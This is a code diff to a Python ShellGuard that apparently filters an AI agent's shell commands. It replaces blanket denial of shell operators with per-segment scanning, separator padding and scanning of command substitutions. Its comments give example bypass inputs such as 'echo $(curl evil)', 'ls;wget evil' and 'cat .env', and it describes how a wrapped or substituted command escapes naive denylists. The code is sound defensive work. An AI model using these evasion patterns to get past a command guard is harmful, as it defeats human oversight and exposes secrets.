@@ -147,9 +147,6 @@ class ShellGuard:
         "nohup",
         "xargs",
     }
-    CONTROL_OPERATORS = {"&&", "||", ";", "|", ">", ">>", "<", "2>", "2>>"}
-    OUTPUT_REDIRECT_OPERATORS = {">", ">>"}
-    UNSAFE_CONTROL_OPERATORS = CONTROL_OPERATORS - OUTPUT_REDIRECT_OPERATORS
     _SEGMENT_SEPARATORS = {"&&", "||", ";", "|", "&"}
     # Shell wrappers whose real command lives inside a following quoted script arg.
     _WRAPPER_NAMES = {"cmd", "cmd.exe", "powershell", "powershell.exe", "pwsh", "pwsh.exe"}
@@ -187,19 +184,32 @@ class ShellGuard:
         # A shell wrapper (cmd /c "...", powershell -c "...") hides its real command inside a
         # quoted arg that shlex keeps as one token; re-scan those payloads so a wrapped
         # del/rm/iwr is seen by the word/leader denylists.
+        # Compound commands are DECOMPOSED, not blanket-denied — this mirrors Claude Code's model
+        # ("a rule must match each subcommand independently"; separators &&, ||, ;, |, |&, &, newline).
+        # Each pipeline/chain segment's leader command is run through the destructive/network/secret
+        # denylists below, so a dangerous command in ANY segment (`foo | curl evil`, `foo && rm x`) is
+        # still caught, while a safe pipe (`cat f | grep x`, `pytest | tail`) runs WITHOUT forcing a
+        # permission prompt. Blanket-denying the operator itself only punished benign pipes.
+        #
+        # Command substitution ($(...), `...`, <(...)/>(...)) hides a command inside another command's
+        # argument, where the per-segment leader scan cannot see it (`echo $(curl evil)`). Claude Code
+        # documents this as a gap it does NOT parse (it relies on tool-level deny rules). We go one
+        # step stricter: extract the inner commands and feed them through the SAME denylists, so a
+        # hidden curl/rm/secret is caught while a benign substitution (a backtick in a commit message)
+        # passes because its inner word is not dangerous. Residual: deeply-nested $(...$(...)...) parsing
+        # is best-effort (a static scan cannot fully contain an interpreter — that is the sandbox's job).
         wrapper_leaders: list[str] = []
         wrapper_words: list[str] = []
-        for script in self._wrapper_scripts(tokens):
+        for script in self._wrapper_scripts(tokens) + self._substitution_scripts(command):
             wrapper_leaders.extend(self._segment_leaders(script))
             wrapper_words.extend(self._command_words(self._tokens(script)))
         token_words = self._command_words(tokens) + wrapper_words
         leaders = leaders + wrapper_leaders
 
         if not self.permissions.get("allow_shell_operators", False):
+            # Output redirects (>, >>) can clobber files outside the workspace or overwrite secrets, so
+            # their targets are still validated. Pipes/&&/;/| are allowed (decomposed + scanned above).
             self._validate_output_redirects(command)
-            for operator in self.UNSAFE_CONTROL_OPERATORS:
-                if operator in tokens:
-                    raise ShellPolicyError(f"Shell control operator denied: {operator}")
 
         # Protected/secret files must not be reachable via the shell tool. Previously only the
         # file tools' PathGuard enforced this, so `cat .env` / `type secrets/key.pem` leaked
@@ -265,10 +275,49 @@ class ShellGuard:
         return True
 
     def _tokens(self, command: str) -> list[str]:
+        padded = self._pad_separators(command)
         try:
-            return shlex.split(command, posix=False)
+            return shlex.split(padded, posix=False)
         except ValueError:
-            return command.split()
+            return padded.split()
+
+    def _pad_separators(self, command: str) -> str:
+        """Surround unquoted command separators (``&&`` ``||`` ``;`` ``|``) with spaces so they
+        tokenise as standalone separators even when written without spaces (``ls;wget evil``,
+        ``cat|grep``). Without this, ``shlex(posix=False)`` keeps ``ls;`` as one token and the
+        pipeline/chain never splits — so a dangerous command in a later, un-spaced segment escaped the
+        per-segment scan. Quote-aware: a ``;`` inside ``python -c "a; b"`` is left untouched (it is not
+        a shell separator). Redirects (``>`` ``2>&1``) and background ``&`` are deliberately not
+        touched — they are not command separators."""
+        out: list[str] = []
+        quote: str | None = None
+        index = 0
+        length = len(command)
+        while index < length:
+            char = command[index]
+            if quote is not None:
+                out.append(char)
+                if char == quote:
+                    quote = None
+                index += 1
+                continue
+            if char in ('"', "'"):
+                quote = char
+                out.append(char)
+                index += 1
+                continue
+            pair = command[index : index + 2]
+            if pair in ("&&", "||"):
+                out.append(f" {pair} ")
+                index += 2
+                continue
+            if char in (";", "|"):
+                out.append(f" {char} ")
+                index += 1
+                continue
+            out.append(char)
+            index += 1
+        return "".join(out)
 
     def _command_words(self, tokens: list[str]) -> list[str]:
         words = []
@@ -351,6 +400,24 @@ class ShellGuard:
                     scripts.append(payload)
                 break
         return scripts
+
+    def _substitution_scripts(self, command: str) -> list[str]:
+        """Inner command strings of $(...), `...`, and <(...)/>(...) substitutions.
+
+        Segmentation splits on shell operators but cannot see a command hidden inside another
+        command's argument via substitution (`echo $(curl evil)`, ``echo `wget evil` ``,
+        `diff <(curl a) b`). Surfacing those inner strings lets the destructive/network/secret
+        denylists scan them too — closing the substitution gap Claude Code leaves to tool-level
+        deny rules. Non-nested extraction is intentional (best-effort for deeply-nested cases).
+        """
+        scripts: list[str] = []
+        for match in re.finditer(r"\$\(([^()]*)\)", command):
+            scripts.append(match.group(1))
+        for match in re.finditer(r"`([^`]*)`", command):
+            scripts.append(match.group(1))
+        for match in re.finditer(r"[<>]\(([^()]*)\)", command):
+            scripts.append(match.group(1))
+        return [script for script in scripts if script.strip()]
 
     def _network_hit(self, leaders: list[str], normalized: str) -> str | None:
         for leader in leaders:
